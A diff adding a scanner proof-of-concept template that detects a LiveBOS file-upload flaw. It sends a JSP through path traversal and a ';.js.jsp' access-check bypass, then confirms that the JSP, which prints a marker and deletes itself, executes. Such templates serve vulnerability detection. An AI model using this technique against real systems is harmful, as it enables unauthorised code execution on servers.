@@ -1,0 +1,43 @@
+name: poc-yaml-LiveBOS-UploadFile-File-upload
+transport: http
+
+set:
+  username: randomLowercase(6)
+  randbody: base64Decode("cGJveWpubnJmaXBtcGxzdWtkZWN6dWRzZWZ4bXl3ZQ==")
+  rboundary: randomLowercase(8)
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /feed/UploadFile.do;.js.jsp
+      headers:
+        Content-Type: multipart/form-data; boundary=-WebKitFormBound{{rboundary}}
+      body: " 
+        ---WebKitFormBound{{rboundary}}\r\n\
+        Content-Disposition:form-data; name=\"file\"; filename=\"/../../../../{{username}}.jsp\"\r\n\
+        Content-Type: image/jpeg\r\n\
+        \r\n\
+        <%@ page import=\"java.io.File\" %>\r\n\
+        <%\r\n\
+           out.println(\"{{randbody}}\");\r\n\
+           String filePath = application.getRealPath(request.getServletPath());\r\n\
+           new File(filePath).delete();\r\n\
+        %>\r\n\
+        ---WebKitFormBound{{rboundary}}--\r\n\
+        "
+    expression: response.status == 200
+
+  r1:
+    request:
+      method: GET
+      path: /{{username}}.jsp;.js.jsp
+    expression: response.status == 200 && response.body.bcontains(bytes(randbody))
+
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/140926931
